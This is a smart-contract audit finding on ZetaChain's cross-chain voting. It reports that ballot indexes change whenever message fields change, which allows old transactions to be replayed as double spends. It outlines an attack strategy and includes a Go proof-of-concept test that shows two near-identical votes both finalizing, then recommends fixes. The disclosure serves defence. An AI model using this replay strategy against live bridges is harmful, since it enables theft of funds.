# [H] Inconsistent Voting Index Leads to Double Spends in Future

## Summary
Severity: High
Chain: Smart contract
Component: 2023-11-zetachain
Published: 2023-12-15
Source: https://github.com/code-423n4/2023-11-zetachain-findings/issues/327
Type: code-finding

## Details
# Lines of code

https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/proto/crosschain/tx.proto#L141
https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/proto/crosschain/tx.proto#L117


# Vulnerability details

## Impact
The voting process works as follows: 

1. An observer sees an event and sends a message to Zetachain to vote on the occurrence. 
2. The message structure is hashed to determine the ballot to be used.
3. The vote is added based upon the hashed value. 
4. If enough votes have been received, then the finalization occurs. This means relaying to the zEVM or another chain. 
  
The ``index`` of an observed transaction ``MsgVoteOnObservedInboundTx`` is calculated by taking a *hash* of the incoming message. For every observer that votes on a given event, the index should be the same. The protection in place for stopping *duplicate* transactions is simply checking if this ``index`` has occurred already. Since the ballots are never deleted, this works well. 
  
However, the ``index`` is *too granular*. Many aspects of an event are guaranteed to not change: sender/receiver change, tx hash, amount, cointype, etc. This is NOT the case with several of the fields that are hardcoded into the Zetaclient but may change in the future. Gaslimit (hardcoded in app) and asset (which is currently blank) are unused fields that may change in the future. On top of this, a change in encoding, what the zetaclient signs or anything else would result in a different hash as well.
  
Additionally, any newly added fields would change the index of previous ballots as well. If this sounds farfetched, there is already a case of this happening since deployment. The field ``eventIndex`` was added very recently to the repository, since multiple events can happen within a single transaction. If the current Zetachain deployment had the ``AddToInTxTracker`` then it would be possible to exploit the new ``eventIndex`` field changes the hash to retrigger the CCTX.
  
If any of these values change in the future, then the ballot ``index`` would change. Since this index is the only security protection for duplicate submissions, the same event could be submitted once again. To make matters worse, there is nothing within the ``TxInTracker`` on the zetachain or zetaclient that checks that an event has already occurred. This allows for trivial exploitation when the client or parts of the message are updated.
  
Relying on this index to never change is an unspoken variant now. Since this is not mentioned anywhere, a tiny change made by a developer would result in every CCTX previously created to be valid in the voting process once again. Although there is some waiting involved, a malicious adversary could send CCTXs and simply wait for them to be valid again once a change to the Zetachain or Zetaclient is made.

Attack strategy:

1. Transfer BTC, ETH, ERC20 and Zeta between several different chains in large quantities. 
2. Wait for a change in one of the above fields to occur within the Zetaclient.
3. Resubmit an old transaction into the ``TxInTracker`` with a proof. The zetaclient will see this and all observers will vote on the event occurrence. 
4. Massive profit from duplicate event submission. This can only be done once for very change on the fields. With enough sending of funds back and forth prior to the update, this could lead to massive profits for an attacker.


## Proof of Concept

This proof of concept demonstrates the issue from the Cosmos SDK tests. It sends two events that only differ by the ``GasLimit`` and checks if they get approved or not. To make the proof of concept more viable, you could simulate a change on the zetaclient parameters and send a proof through the ``TxInTracker`` afterwards. Since this requires a change to the zetaclient live, we felt that a Cosmos SDK PoC was clearer to reproduce and easier to understand.

1. Copy the following code into the location ``repos/node/x/crosschain/keeper/keeper_cross_chain_tx_vote_inbound_tx_test.go``. 

```golang
package keeper_test

import (
	"encoding/hex"
	"fmt"
	"testing"

	//"github.com/zeta-chain/zetacore/common"
	sdkmath "cosmossdk.io/math"
	sdk "github.com/cosmos/cosmos-sdk/types"
	"github.com/stretchr/testify/assert"
	keepertest "github.com/zeta-chain/zetacore/testutil/keeper"
	"github.com/zeta-chain/zetacore/x/crosschain/keeper"
	"github.com/zeta-chain/zetacore/x/crosschain/types"
	observerTypes "github.com/zeta-chain/zetacore/x/observer/types"
	observertypes "github.com/zeta-chain/zetacore/x/observer/types"
)

/*
Potential Double Event Submission
*/
func TestNoDoubleEventProtections(t *testing.T) {
	k, ctx, _, zk := keepertest.CrosschainKeeper(t)

	// MsgServer for the crosschain keeper
	msgServer := keeper.NewMsgServerImpl(*k)

	// Set the chain ids we want to use to be valid
	params := observertypes.DefaultParams()
	zk.ObserverKeeper.SetParams(
		ctx, params,
	)

	// Convert the validator address into a user address.
	validators := k.StakingKeeper.GetAllValidators(ctx)
	validatorAddress := validators[0].OperatorAddress
	valAddr, _ := sdk.ValAddressFromBech32(validatorAddress)
	addresstmp, err := sdk.AccAddressFromHexUnsafe(hex.EncodeToString(valAddr.Bytes()))
	validatorAddr := addresstmp.String()

	// Add validator to the observer list for voting
	chains := zk.ObserverKeeper.GetParams(ctx).GetSupportedChains()
	for _, chain := range chains {
		zk.ObserverKeeper.SetObserverMapper(ctx, &observertypes.ObserverMapper{
			ObserverChain: chain,
			ObserverList:  []string{validatorAddr},
		})
	}

	// Vote on the FIRST message.
	msg := &types.MsgVoteOnObservedInboundTx{
		Creator:       validatorAddr,
		Sender:        "0x954598965C2aCdA2885B037561526260764095B8",
		SenderChainId: 1, // ETH
		Receiver:      "0x954598965C2aCdA2885B037561526260764095B8",
		ReceiverChain: 7000, // zetachain
		Amount:        sdkmath.NewUintFromString("10000000"),
		Message:       "",
		InBlockHeight: 1,
		GasLimit:      1000000000,
		InTxHash:      "0x7a900ef978743f91f57ca47c6d1a1add75df4d3531da17671e9cf149e1aefe0b",
		CoinType:      0, // zeta
		TxOrigin:      "0x954598965C2aCdA2885B037561526260764095B8",
		Asset:         "",
		EventIndex:    1,
	}
	_, err = msgServer.VoteOnObservedInboundTx(
		ctx,
		msg,
	)
	assert.Equal(t, err, nil)

	// Check that the vote passed
	ballot, _, _ := zk.ObserverKeeper.FindBallot(ctx, msg.Digest(), zk.ObserverKeeper.GetParams(ctx).GetChainFromChainID(msg.SenderChainId), observerTypes.ObservationType_InBoundTx)
	if ballot.BallotStatus == observerTypes.BallotStatus_BallotFinalized_SuccessObservation {
		fmt.Println("First ballot passed!")
	} else {
		fmt.Println("First ballot failed!")
	}

	//Perform the SAME event. Except, this time, we resubmit the event.
	msg2 := &types.MsgVoteOnObservedInboundTx{
		Creator:       validatorAddr,
		Sender:        "0x954598965C2aCdA2885B037561526260764095B8",
		SenderChainId: 1,
		Receiver:      "0x954598965C2aCdA2885B037561526260764095B8",
		ReceiverChain: 7000,
		Amount:        sdkmath.NewUintFromString("10000000"),
		Message:       "",
		InBlockHeight: 1,
		GasLimit:      1000000001, // <---- Change here
		InTxHash:      "0x7a900ef978743f91f57ca47c6d1a1add75df4d3531da17671e9cf149e1aefe0b",
		CoinType:      0,
		TxOrigin:      "0x954598965C2aCdA2885B037561526260764095B8",
		Asset:         "",
		EventIndex:    1,
	}

	fmt.Println("Vote again with the same TxHash")
	_, err = msgServer.VoteOnObservedInboundTx(
		ctx,
		msg2,
	)

	assert.Equal(t, err, nil)

	fmt.Println("Treated as a separate event.")
	fmt.Println("In many years, things may change... GasLimit, message, asset... If any of these change, a double spend is possible. Since thesea are not guarenteed to stay the same, this is worrisome.")
	fmt.Println("With the InTrackerTx being possible via a proof, this allows arbitrary users to do this as well.")

	// Get all cross chain TXs
	cctxs := k.GetAllCrossChainTx(ctx)
	_ = cctxs

	cctx1 := cctxs[0]
	cctx2 := cctxs[1]

	// Ensure that the status's have completed.
	assert.Equal(t, cctx1.CctxStatus.Status, types.CctxStatus_OutboundMined)
	assert.Equal(t, cctx1.CctxStatus.Status, cctx2.CctxStatus.Status)

	fmt.Println("Msg Digest Difference: ", msg.Digest(), msg2.Digest())
	assert.NotEqual(t, msg.Digest(), msg2.Digest())

	// Checking that the two hashes are the same
	assert.Equal(t, cctx1.InboundTxParams.InboundTxObservedHash, cctx2.InboundTxParams.InboundTxObservedHash)
}
```

2. Run the command ``go test -v ./x/crosschain/keeper/ -run TestNoDoubleEventProtections``. 

3. Notice that even though a single value of the incoming TX has changed, the vote for the TX passes.

## Remediation

### Short Term
The obvious solution would be to remove fields that can change over time from the message. This way, small changes do not change the voting index and compromise the duplicate event submission check. However, this does NOT work because it would allow the *finalizing* vote to set many of the fields, which would be bad. 
  
So, it is recommended to have a separate structure for keeping track of events that have already occurred besides the voting process that is specific ``index`` for an event. For instance, the tx hash, event id and chain id are a great way to verify that an event occurred already to guarantee that the same event is not trying to be added again.

### Long Term 
Defense in depth measures can be put in place to secure this more. 
  
An obvious one is having a *timeout*. For instance, maximum blocks between events or a week of actual time. This would *limit* the scope of the exploit to only recent changes. 
  
Another one would be introducing a *version* scheme for each change the message. On the event voting side, only allowing for specific versions past a specific point would ensure that old ballots could not be resubmitted.
  
Rigorous testing to ensure that *old* transactions are the same compared to new ones. If a library is upgraded, a byte is dropped or anything else, then a *different* index will be created, resulting in lost funds.










## Assessed type

Other
